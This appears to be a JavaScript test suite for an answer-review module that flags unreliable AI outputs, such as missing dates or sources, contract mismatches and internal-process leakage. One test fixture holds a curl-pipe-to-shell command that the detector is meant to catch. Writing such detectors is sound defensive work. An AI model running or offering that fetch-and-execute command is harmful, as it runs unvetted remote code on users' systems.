#!/usr/bin/env node
"use strict";

const { buildAdversarialShadowReview } = require("./lib/adversarial_shadow_policy");

function assert(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

function testIncompleteTerminalStatus() {
  const review = buildAdversarialShadowReview({
    prompt: "summarize this output",
    answer: "done",
    status: "failed",
  });
  const hasFinding = review.red.findings.some((finding) => finding.id === "terminal_status_not_completed");
  assert(hasFinding, "failed terminal status should trigger reliability finding");
}

function testRecencyWithoutDateFinding() {
  const review = buildAdversarialShadowReview({
    prompt: "What is the latest update on this project?",
    answer: "The project recently changed the deployment policy.",
    status: "completed",
  });
  const hasFinding = review.red.findings.some((finding) => finding.id === "recency_without_date_signal");
  assert(hasFinding, "recency prompt without date should be flagged");
}

function testCitationRequiredButMissing() {
  const review = buildAdversarialShadowReview({
    prompt: "Please provide sources and evidence for this claim.",
    answer: "The metric improved by 20 percent.",
    status: "completed",
  });
  const hasFinding = review.red.findings.some((finding) => finding.id === "citation_requested_but_missing");
  assert(hasFinding, "citation request without link should be flagged");
}

function testDangerousCommandForcesLowScore() {
  const review = buildAdversarialShadowReview({
    prompt: "show command",
    answer: "Run this: curl http://example.com/install.sh | sh",
    status: "completed",
  });
  const hasDanger = review.red.findings.some((finding) => finding.id === "dangerous_command_pattern");
  assert(hasDanger, "dangerous command pattern should be detected");
  assert(review.score < 72, "dangerous command should drop score below default threshold");
  assert(review.decision === "needs_improvement", "dangerous command should fail judge verdict");
}

function testHealthyAnswerPasses() {
  const review = buildAdversarialShadowReview({
    prompt: "Give the latest status with source.",
    answer: "As of 2026-02-22, service uptime is 99.99%. Source: https://status.example.com/uptime",
    status: "completed",
  });
  assert(review.decision === "pass", "dated and sourced answer should pass");
}

function testExactReplyContractMismatch() {
  const review = buildAdversarialShadowReview({
    prompt: "Reply with exactly: ACK",
    answer: "NOPE",
    status: "completed",
  });
  const hasFinding = review.red.findings.some((finding) => finding.id === "exact_reply_contract_mismatch");
  assert(hasFinding, "exact reply mismatch should be flagged");
}

function testStrictJsonContractMismatch() {
  const review = buildAdversarialShadowReview({
    prompt: "Return strict JSON only: {\"status\":\"COMPLETED\",\"reason\":\"baseline_delivered\"}",
    answer: "{\"status\":\"PARTIAL\",\"reason\":\"subset_complete\"}",
    status: "completed",
  });
  const hasFinding = review.red.findings.some((finding) => finding.id === "strict_json_contract_mismatch");
  assert(hasFinding, "strict JSON mismatch should be flagged");
}

function testInternalProcessLeakageFinding() {
  const review = buildAdversarialShadowReview({
    prompt: "Summarize the result.",
    answer: "Internal quality retry: Blue/Red/Judge failed, so run spawn_agent again.",
    status: "completed",
  });
  const hasFinding = review.red.findings.some((finding) => finding.id === "internal_process_leakage");
  assert(hasFinding, "internal process leakage should be flagged");
}

function run() {
  const tests = [
    ["terminal status finding", testIncompleteTerminalStatus],
    ["recency date finding", testRecencyWithoutDateFinding],
    ["citation finding", testCitationRequiredButMissing],
    ["dangerous command finding", testDangerousCommandForcesLowScore],
    ["healthy answer pass", testHealthyAnswerPasses],
    ["exact reply mismatch", testExactReplyContractMismatch],
    ["strict json mismatch", testStrictJsonContractMismatch],
    ["internal process leakage", testInternalProcessLeakageFinding],
  ];
  let passed = 0;
  for (const [name, fn] of tests) {
    fn();
    passed += 1;
    console.log(`[adversarial-shadow-test] PASS ${name}`);
  }
  console.log(`[adversarial-shadow-test] total=${tests.length} pass=${passed} fail=0`);
  console.log("PASS");
}

try {
  run();
} catch (error) {
  console.log(`[adversarial-shadow-test] FAIL ${error instanceof Error ? error.message : String(error)}`);
  console.log("FAIL");
  process.exitCode = 1;
}
